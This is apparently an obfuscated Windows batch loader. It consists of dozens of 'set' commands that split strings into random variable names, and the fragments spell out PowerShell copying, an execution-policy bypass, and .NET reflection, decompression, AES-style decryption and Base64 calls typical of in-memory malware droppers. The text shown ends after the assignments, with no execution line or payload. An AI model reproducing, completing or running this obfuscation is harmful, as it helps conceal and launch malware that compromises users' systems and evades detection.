@echo off
set "qDsDhHIFuX=ow"
set "HheczCTPEe=ll"
set "OOYRmKvhUt=ws"
set "OtOBIzItUB=\v"
set "BbKbKHzLUL=do"
set "uiyhEwyPFh=s\"
set "ObCwSbdxSi=ll"
set "RZvxcQLPWZ=rs"
set "mkXAvcASeb=:\"
set "SGfPZVaCjh=py"
set "QEIWXefqhP=nd"
set "rRAezgBEMP=he"
set "gXHYEIiRSQ=0\"
set "AZDHzEXYuu=he"
set "anwdXSjdbu=1."
set "UpwnQWgxbK=in"
set "ursFsHCbCr=Sy"
set "CUMAZZeFRY=Wi"
set "XkLoKZCjsr=st"
set "YaMJsJUtYA= /"
set "fGddZkwjwF=\W"
set "rykUDHgArB=em"
set "VEeStAFyzZ=we"
set "KLoLRfqFbf=rS"
set "cTMSrhlbYZ=po"
set "vveZHedatn=xe"
set "SNLAZdWbss=we"
set "ouUoonMXLu=co"
set "rkpEhzWjEi= C"
set "GqLZuZlNlA=32"
set "XWlSWHzIfx=y "
set "kXeLGqTxjx=Po"
set "dJrSYcxpPA=.e"
set "eMmzXpzjpO= %~dp0"
set "XzMsRxsuIs=cd"
set "sOZOKsMbzJ='[-1"
set "ZMcvhwadEt=] -j"
set "qylGyjHKNh=::De"
set "WVhEhHxqiE=ct S"
set "FxFUBMkSRU=se()"
set "HzvpqZkZPa=and "
set "XpGHluOdNs=ing("
set "wLCVayCajU=..-1"
set "lYOKVtXAAb=ptog"
set "yKmBGoyqbK=U.En"
set "lZdvrCqzly=]::C"
set "uuSUdlppdK=bstr"
set "waOwCLGdMa=Obje"
set "GzYntXhfhc=bypa"
set "uvRDEGjlnT=hUyw"
set "TmNoZqHJaj=rhUy"
set "TzvsgyjcYu=);$o"
set "EedORluojC=orF'"
set "QVXOOXeJla='')("
set "DGswLOLibb=join"
set "RBHexFhYFJ=Obje"
set "tMhSnxuXnV=pStr"
set "lctpEWowAT=yw);"
set "FDspLLxaAM=($VH"
set "xNRPjqPvnr=vj0m"
set "qEluKaXUcv=ose("
set "aaJZLzqYwN=jIjv"
set "VPNeWHlGUG=);$Q"
set "WINFREbTNP=y]::"
set "vHVKXmrdzx=; };"
set "GWDbrNZleg=bX ="
set "MRAOZbCYDH=[Sys"
set "fKndvrpOtk=OK, "
set "nskyRZLgWs=6esa"
set "KeYysAWZxc=OyzA"
set "BcDYQjWyge=tS46"
set "rQtZYTGssN=ion."
set "GNPWHrKnxo=ZYYc"
set "EHjrrRIviA=lBlo"
set "qpitPKUdGT=Comp"
set "tCjVGDbWPs=tryP"
set "WOynCAytQx=trea"
set "bQQYjFgILg=m.IO"
set "dluSlFoNDz=.Com"
set "cXZCFcdEpG=();$"
set "yCSpqHAKsY=yste"
set "FpYWyqAtct=.Len"
set "srSEusFQVN=+hAO"
set "YWXDxtexGQ=-Obj"
set "elLsrdKbvJ=ddin"
set "OWHLQveNyn=onve"
set "GhQEmSqjMR=;$Fk"
set "PypuFkLIdY=v.Su"
set "TtfJLAxdpf=UR.D"
set "EuLZJybCaS=zZ.T"
set "BgtAQOeOUv=sp.T"
set "HMcVYxPMVu='[-1"
set "fHmQkYLZvL=y.Pa"
set "YKJCFTtFvO=w = "
set "DTiBWOjUce=ke($"
set "LOlWmrQwdq=K = "
set "ULKPAzEkjO=TllA"
set "avfHyUkbJj=flec"
set "khiIlQNuxw=ress"
set "tBQsSOtRwC=esFX"
set "UalShqLGRe=);$j"
set "StjSTiFGWp=oL'["
set "CrcoxPYjAT=ment"
set "hMWPVdWSfV== [S"
set "ZfHPPlBRzJ=ress"
set "PKmlvQfItA= [Sy"
